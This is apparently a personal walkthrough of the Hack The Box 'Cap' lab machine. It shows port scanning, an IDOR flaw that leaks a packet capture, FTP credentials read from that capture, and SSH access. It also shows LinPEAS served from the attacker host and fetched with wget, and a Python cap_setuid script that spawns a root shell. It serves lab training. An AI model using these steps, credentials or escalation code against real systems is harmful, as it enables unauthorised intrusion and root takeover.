- - - 
created : 18-09-2025 

Tags : #easy 

Released on 05 Jun 2021
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a cap.htb -- -A      

Open 10.10.10.245:22
Open 10.10.10.245:21
Open 10.10.10.245:80

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
```
# Enumeration
## HTTP (80)
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u  http://cap.htb 

/capture              (Status: 302) [Size: 222] [--> http://cap.htb/data/10]
/data                 (Status: 302) [Size: 208] [--> http://cap.htb/]
/ip                   (Status: 200) [Size: 17466]
/netstat              (Status: 200) [Size: 34889]
```

![Pasted image 20250918191540.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918191540.png)

This suggests that the application is executing system commands. Clicking on the Security Snapshot menu item pauses the page for a few seconds and returns a page as shown below:

![Pasted image 20250918191758.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918191758.png)

### WireShark

We can use [Wireshark](../../../3%20-%20Tags/Hacking%20Tools/Wireshark.md) to examine the `Download` file:

We don't see anything interesting .
# Exploit
### IDOR

One interesting thing to notice is the URL scheme when creating a new capture, that is of the form
/data/<> . The id is incremented for every capture. It's possible that there were packet
captures from users before us.
Browsing to /data/0 does indeed reveal a packet capture with multiple packets.

![Pasted image 20250918194749.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918194749.png)

This vulnerability is known as Insecure Direct Object Reference ([IDOR](../../../3%20-%20Tags/Hacking%20Concepts/IDOR.md)), wherein a user can directly
access data owned by another user. Let's examine this capture for potential sensitive data.

![Pasted image 20250918194905.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250918194905.png)

Opening the ID 0 capture file in Wireshark reveals [FTP](../../../3%20-%20Tags/Hacking%20Concepts/FTP.md) traffic, including the user authentication.

The traffic is not encrypted, allowing us to retrieve the user credentials i.e. `nathan : Buck3tH4TF0RM3!` . These are found to be valid not only for [FTP](../../../3%20-%20Tags/Hacking%20Concepts/FTP.md) but can be used to login via [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md).
## SSH

These creds are found to be valid not only for [FTP](../../../3%20-%20Tags/Hacking%20Concepts/FTP.md) but can be used to login via [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ ssh nathan@cap.htb         

nathan@cap:~$ cat user.txt 
  HTB{{REDACTED_FLAG}}
```
# Privilege Escalation

Let's use [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ locate linpeas.sh                                
/home/mdn0x/Documenti/GitTools/Enum/linpeas.sh
/home/mdn0x/HTB/Academy/Knowledgecheck/linpeas.sh
/home/mdn0x/HTB/Machines/Editor/linpeas.sh
/home/mdn0x/HTB/Machines/Planning/CVE-2024-9264-RCE-Exploit/linpeas.sh
/home/mdn0x/HTB/Machines/Soulmate/Root/linpeas.sh
/home/mdn0x/THM/CHALLENGES/Easy/Startup/linpeas.sh
/home/mdn0x/THM/CHALLENGES/Easy/mKingdom/linpeas.sh
/usr/share/peass/linpeas/linpeas.sh

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ cp /home/mdn0x/Documenti/GitTools/Enum/linpeas.sh .

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ ls               
0.pcap  Cap.pdf  linpeas.sh  root.txt  user.txt

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Cap]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
nathan@cap:/tmp$ wget http://10.10.14.177/linpeas.sh
--2025-09-18 18:00:48--  http://10.10.14.177/linpeas.sh
Connecting to 10.10.14.177:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 134168 (131K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                    100%[==============================================>] 131.02K   240KB/s    in 0.5s    

2025-09-18 18:00:49 (240 KB/s) - ‘linpeas.sh’ saved [134168/134168]

<SNIP>

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                         
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip                                                             
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

The /usr/bin/python3.8 is found to have `cap_setuid` and `cap_net_bind_service` , which isn't the default setting.

According to the documentation, **CAP_SETUID** allows the process to gain setuid privileges without the **SUID** bit set. This effectively lets us switch to **UID 0** i.e. root.
The developer of Cap must have given Python this capability to enable the site to capture traffic, which a non-root user can't do.

We can create a [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) script to spawn a root shell, we use [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md):

```bash
nathan@cap:~$ cat rootme 
#!/usr/bin/python3.8
import os
os.setuid(0)
os.system("/bin/bash")
```

```bash
nathan@cap:~$ ./rootme 
root@cap:~# cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!